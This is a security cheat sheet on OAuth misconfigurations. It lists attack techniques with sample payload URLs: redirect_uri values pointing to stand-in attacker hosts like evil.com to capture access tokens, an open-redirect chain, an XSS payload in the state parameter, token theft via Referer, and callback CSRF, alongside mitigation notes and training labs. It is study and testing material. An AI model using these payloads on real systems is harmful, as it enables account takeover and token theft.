# oauth misconfiguration

> oauth is a widely-used authorization framework that allows third-party applications to access user data without exposing user credentials. however, improper configuration and implementation of oauth can lead to severe security vulnerabilities. this document explores common oauth misconfigurations, potential attack vectors, and best practices for mitigating these risks. 


## summary

- [stealing oauth token via referer](#stealing-oauth-token-via-referer)
- [grabbing oauth token via redirect_uri](#grabbing-oauth-token-via-redirect---uri)
- [executing xss via redirect_uri](#executing-xss-via-redirect---uri)
- [oauth private key disclosure](#oauth-private-key-disclosure)
- [authorization code rule violation](#authorization-code-rule-violation)
- [cross-site request forgery](#cross-site-request-forgery)
- [labs](#labs)
- [references](#references)


## stealing oauth token via referer

> do you have html injection but can't get xss? are there any oauth implementations on the site? if so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal oauth tokens via referer - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)


## grabbing oauth token via redirect_uri

redirect to a controlled domain to get the access token

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

redirect to an accepted open url in to get the access token

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/backtoauthsubtarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3a%2f%2fapps.facebook.com%2fattacker%2f
```

oauth implementations should never whitelist entire domains, only a few urls so that “redirect_uri” can’t be pointed to an open redirect.

sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```


## executing xss via redirect_uri

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3atext%2fhtml%2ca&state=<script>alert('xss')</script>
```


## oauth private key disclosure

some android/ios app can be decompiled and the oauth private key can be accessed.


## authorization code rule violation

> the client must not use the authorization code  more than once.  

if an authorization code is used more than once, the authorization server must deny the request 
and should revoke (when possible) all tokens previously issued based on that authorization code.


## cross-site request forgery

applications that do not check for a valid csrf token in the oauth callback are vulnerable. this can be exploited by initializing the oauth flow and intercepting the callback (`https://example.com/callback?code=authorization_code`). this url can be used in csrf attacks.

> the client must implement csrf protection for its redirection uri. this is typically accomplished by requiring any request sent to the redirection uri endpoint to include a value that binds the request to the user-agent's authenticated state. the client should utilize the "state" request parameter to deliver this value to the authorization server when making an authorization request.


## labs

* [portswigger - authentication bypass via oauth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
* [portswigger - forced oauth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
* [portswigger - oauth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
* [portswigger - stealing oauth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
* [portswigger - stealing oauth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)


## references

- [all your paypal oauth tokens belong to me - asanso - november 28, 2016](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html) 
- [oauth 2 - how i have hacked facebook again (..and would have stolen a valid access token) - asanso - april 8, 2014](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
- [how i hacked github again - egor homakov - february 7, 2014](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
- [how microsoft is giving your data to facebook… and everyone else - andris atteka - september 16, 2014](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [bypassing google authentication on periscope's administration panel - jack whitton - july 20, 2015](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)